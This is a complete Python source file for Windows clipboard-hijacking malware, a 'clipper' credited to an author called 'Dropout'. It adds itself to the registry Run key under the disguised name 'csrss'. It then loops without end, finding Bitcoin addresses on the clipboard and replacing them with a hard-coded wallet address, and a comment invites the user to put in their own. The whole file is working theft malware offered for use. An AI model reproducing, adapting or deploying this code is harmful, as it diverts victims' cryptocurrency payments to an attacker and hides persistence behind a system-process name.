__data__ = {
    "creator": "Dropout",
    "lines": 81,
    "github": "github.com/Dropout1337"
}

import re
import os
import sys
import winreg
import requests
import threading
import win32clipboard

__address__ = "bc1qukszfk6tc0wlhunygge786sk0gyc4gxsfc0cjr" # Change this to your address. ( send me some btc if you love me <3 )
__regex__   = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]+" # Keep this the same unless the bitcoin address(s) ever change.

class Clipper:

    def Add_Startup():
        """
        Adds the python file/compiled exe to the computers
        startup.
        """
        path = os.getenv("APPDATA")
        file_name = sys.argv[0]
        address = os.getenv('LOCALAPPDATA') + '\\Programs\\Python\\Launcher\\py.exe' + ' ' + '-i ' + '"' + path + '\\' + file_name + '"'
        key1 = winreg.HKEY_CURRENT_USER
        key_value1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
        if open_:
            winreg.SetValueEx(open_,"csrss",0,winreg.REG_SZ,address)
            open_.Close()

    def Change_Clipboard():
        """
        Changes the clipboard to the new bitcoin address.
        """
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(__address__)
            win32clipboard.CloseClipboard()
            return True
        except:
            return False

    def Get_Clipboard():
        """
        Gets whats on the current clipboard.
        """
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            has_bitcoin_address = re.findall(__regex__, data)
            if has_bitcoin_address != []:
                return data
            else:
                return False
        except:
            return False

    def Task():
        """
        Runs a task to check if there is a bitcoin address in the clipboard.
        """
        try:
            check = Clipper.Get_Clipboard()
            if check != False:
                Clipper.Change_Clipboard()
        except:
            pass

if __name__ == "__main__":
    try:
        Clipper.Add_Startup()
        while True:
            Clipper.Task()
    except:
        pass
